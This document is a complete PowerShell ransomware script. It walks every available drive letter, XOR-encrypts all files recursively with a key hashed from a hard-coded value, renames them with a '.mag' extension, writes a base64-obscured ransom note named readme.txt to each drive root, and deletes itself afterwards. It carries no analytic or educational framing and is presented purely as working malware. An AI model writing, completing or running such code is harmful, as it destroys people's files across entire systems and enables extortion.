function Decode-Base64-Twice {
    param (
        [string]$Base64String
    )
    $FirstDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64String))
    $SecondDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($FirstDecoded))
    return $SecondDecoded
}

function Create-RansomNote {
    param (
        [string]$TargetDirectory,
        [string]$NoteContent
    )
    $NotePath = Join-Path -Path $TargetDirectory -ChildPath "readme.txt"
    [System.IO.File]::WriteAllText($NotePath, $NoteContent)
    Write-Host "Ransom note created: $NotePath" -ForegroundColor Green
}

function XOR-EncryptDecrypt {
    param (
        [byte[]]$Data,
        [string]$Key
    )
    $KeyLength = $Key.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Data[$i] = $Data[$i] -bxor [byte][char]$Key[$i % $KeyLength]
    }
    return $Data
}

function XOR-File {
    param (
        [string]$FilePath,
        [string]$Key
    )
    $Data = [System.IO.File]::ReadAllBytes($FilePath)
    $EncryptedData = XOR-EncryptDecrypt -Data $Data -Key $Key
    [System.IO.File]::WriteAllBytes($FilePath, $EncryptedData)
}

function Generate-MD5-Hash {
    param (
        [string]$Value
    )
    $MD5 = [System.Security.Cryptography.MD5]::Create()
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Value)
    $HashBytes = $MD5.ComputeHash($Bytes)
    $Hash = [BitConverter]::ToString($HashBytes) -replace "-", ""
    return $Hash.ToLower()
}

function Derive-EncryptionKey {
    $HashValue = Generate-MD5-Hash -Value "1777"
    $DerivedKey = $HashValue.Substring($HashValue.Length - 4, 4)
    return $DerivedKey
}

function Validate-ExecutionKey {
    param (
        [string]$ExecutionKey
    )
    if ($ExecutionKey -ne "1777") {
        Write-Host "Invalid execution key! The script will not proceed." -ForegroundColor Red
        return $false
    }
    return $true
}

function Get-AvailableDrives {
    $Drives = @()
    foreach ($Drive in 'A'..'Z') {
        $Path = "${Drive}:\"
        if (Test-Path -Path $Path) {
            $Drives += $Path
        }
    }
    return $Drives
}

function Encrypt-Files {
    param (
        [string]$EncryptionKey,
        [string[]]$TargetDirectories
    )

    foreach ($TargetDirectory in $TargetDirectories) {
        Get-ChildItem -Path $TargetDirectory -Recurse -File | ForEach-Object {
            $FilePath = $_.FullName
            $NewFilePath = "${FilePath}.mag"
            try {
                XOR-File -FilePath $FilePath -Key $EncryptionKey
                Rename-Item -Path $FilePath -NewName $NewFilePath
                Write-Host "Encrypted: $NewFilePath" -ForegroundColor Cyan
            } catch {
                Write-Host "Failed to encrypt ${FilePath}: $_" -ForegroundColor Yellow
            }
        }
        Create-RansomNote -TargetDirectory $TargetDirectory -NoteContent $DecodedNote
    }
}

function Self-Delete {
    $ScriptPath = $MyInvocation.MyCommand.Path
    try {
        Remove-Item -Path $ScriptPath -Force
        Write-Host "Script $ScriptPath has been deleted." -ForegroundColor Green
    } catch {
        Write-Host "Failed to delete script ${ScriptPath}: $_" -ForegroundColor Yellow
    }
}

function Main {
    param (
        [string]$ExecutionKey
    )

    if (-not (Validate-ExecutionKey -ExecutionKey $ExecutionKey)) {
        return
    }

    $Base64String = "SVNFaElFOVBVRk1zSUZkRklF..."
    $DecodedNote = Decode-Base64-Twice -Base64String $Base64String
    $EncryptionKey = Derive-EncryptionKey

    # Get all available drives
    $AvailableDrives = Get-AvailableDrives
    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives
    Self-Delete
}

Main -ExecutionKey $args[0]
